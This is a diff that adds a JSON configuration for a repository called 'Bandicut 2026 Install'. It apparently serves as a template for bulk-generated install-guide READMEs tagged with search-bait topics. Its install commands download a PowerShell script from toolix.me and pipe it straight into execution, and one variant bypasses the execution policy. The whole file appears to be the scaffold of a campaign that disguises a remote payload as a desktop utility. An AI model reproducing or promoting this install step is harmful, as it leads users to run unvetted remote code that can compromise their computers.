@@ -1,0 +1,26 @@
+{
+  "repo": "Bandicut-2026-Install",
+  "product": "Bandicut 2026 Install",
+  "product_title": "Bandicut 2026 Install",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "system-tools",
+  "topics": [
+    "how-to-install-bandicut-install",
+    "bandicut-install-app",
+    "repository-readme",
+    "install-guide",
+    "desktop-software",
+    "bandicut-install-desktop-tool",
+    "bandicut-install-windows-tool",
+    "bandicut-install",
+    "bandicut-install-desktop-2026",
+    "windows-11"
+  ],
+  "site": "toolix.me"
+}
